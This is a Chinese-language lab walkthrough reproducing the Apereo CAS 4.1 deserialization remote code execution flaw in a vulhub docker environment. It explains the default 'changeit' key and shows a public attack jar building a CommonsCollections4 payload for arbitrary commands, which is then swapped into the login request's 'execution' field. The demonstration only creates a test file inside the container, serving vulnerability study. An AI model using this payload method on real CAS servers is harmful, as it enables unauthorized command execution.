## 一、准备工作

复现此漏洞需要安装docker，下载安装docker-compose，搭建vulhub靶场，保证攻击机与靶机之间的网络互通；下载Apereo-CAS-Attack利用工具。

## 二、漏洞介绍

Apereo
CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。

参考链接：

  * <https://apereo.github.io/2016/04/08/commonsvulndisc/>

## 三、复现过程

首先启动靶机漏洞环境：

我们cd到vulhub目录下的该漏洞目录

cd vulhub/apereo-cas/4.1-rce/

  

在此目录下执行命令docker-compose up -d

启动漏洞环境

![1652171883_627a246b0393ced8aa974.png!small?1652171883603](https://image.3001.net/images/20220510/1652171883_627a246b0393ced8aa974.png!small?1652171883603)

提示done后使用攻击机访问<http://XXX.XXX.XXX.XXX:8080/cas/login>即可查看到登陆页面，xxx为你的靶机IP，我的是<http://192.168.192.130:8080/cas/login>

![1652171832_627a2438efb035d69a7ed.png!small?1652171833632](https://image.3001.net/images/20220510/1652171832_627a2438efb035d69a7ed.png!small?1652171833632)

 **漏洞原理实际上是Webflow中使用了默认密钥** changeit：

  

public class EncryptedTranscoder implements Transcoder {

private CipherBean cipherBean;

private boolean compression = true;

  

public EncryptedTranscoder() throws IOException {

BufferedBlockCipherBean bufferedBlockCipherBean = new
BufferedBlockCipherBean();

bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES",
"CBC", "PKCS7"));

bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());

bufferedBlockCipherBean.setKeyAlias("aes128");

bufferedBlockCipherBean.setKeyPassword("changeit");

bufferedBlockCipherBean.setNonce(new RBGNonce());

this.setCipherBean(bufferedBlockCipherBean);

}

  

// ...

  

我们使用Apereo-CAS-Attack来复现。

  

java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "要执行的命令"

为了回显明显，我这里使用的是touch命令在docker容器下的temp目录生成一个名为test的文件。

java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch
/tmp/test"

![1652171919_627a248f6b5314d860c03.png!small?1652171920752](https://image.3001.net/images/20220510/1652171919_627a248f6b5314d860c03.png!small?1652171920752)

然后我们回到靶机登录页面，输入信息点击登陆抓包，替换Body中的execution值替换成上面生成的Payload后send

![1652171986_627a24d23febf0233eaca.png!small?1652171987203](https://image.3001.net/images/20220510/1652171986_627a24d23febf0233eaca.png!small?1652171987203)

由于是实验环境，我们可以登录到服务器，然后进入docker容器查看文件是否创建，命令执行结果

 **我自己** **docker** **用的就不熟，所以这里也把进入容器的方法贴一下：**

 **首先使用** **docker ps** **命令找到我们容器的** **ID**

![1652172025_627a24f92f07c3d724efe.png!small?1652172025750](https://image.3001.net/images/20220510/1652172025_627a24f92f07c3d724efe.png!small?1652172025750)

然后再使用docker exec -it 容器ID /bin/bash 的命令就可以进到容器内部了

![1652172032_627a25007652f84c13f7d.png!small?1652172033125](https://image.3001.net/images/20220510/1652172032_627a25007652f84c13f7d.png!small?1652172033125)

 **docker** **容器的退出方法：**

 **第一种** **:Ctrl + d** **退出并停止容器** **;**

 **第二种** **:Ctrl + p + q** **退出并在后台运行容器** **;**

  

进入后我们cd到/tmp目录下

执行成功：![1652172047_627a250f85e271d02bf8f.png!small?1652172048122](https://image.3001.net/images/20220510/1652172047_627a250f85e271d02bf8f.png!small?1652172048122)

  

